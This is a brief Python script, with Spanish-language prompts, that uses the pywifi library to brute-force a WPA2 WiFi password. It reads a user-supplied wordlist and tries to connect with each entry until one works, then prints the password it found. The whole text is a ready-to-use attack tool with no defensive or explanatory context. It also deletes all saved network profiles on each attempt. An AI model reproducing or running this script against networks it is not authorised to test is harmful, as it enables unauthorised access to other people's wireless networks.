import pywifi
   from pywifi import const
   import time
   
   wifi = pywifi.PyWiFi()
   iface = wifi.interfaces()[0]
   
   def connect_wifi(ssid, password):
       iface.scan()
       time.sleep(2)
       scan_results = iface.scan_results()
       for result in scan_results:
           if result.ssid == ssid:
               profile = pywifi.Profile()
               profile.ssid = ssid
               profile.auth = const.AUTH_ALG_OPEN
               profile.akm.append(const.AKM_TYPE_WPA2PSK)
               profile.cipher = const.CIPHER_TYPE_CCMP
               profile.key = password
               iface.remove_all_network_profiles()
               temp_profile = iface.add_network_profile(profile)
               iface.connect(temp_profile)
               time.sleep(5)
               if iface.status() == const.IFACE_CONNECTED:
                   return True
               else:
                   return False
   
   ssid = input("Ingrese el nombre de la red WiFi: ")
   wordlist = input("Ruta al archivo de diccionario: ")
   
   with open(wordlist, "r") as file:
       passwords = file.readlines()
       for password in passwords:
           password = password.strip()
           print("Probando: " + password)
           if connect_wifi(ssid, password):
               print("Contraseña encontrada: " + password)
               break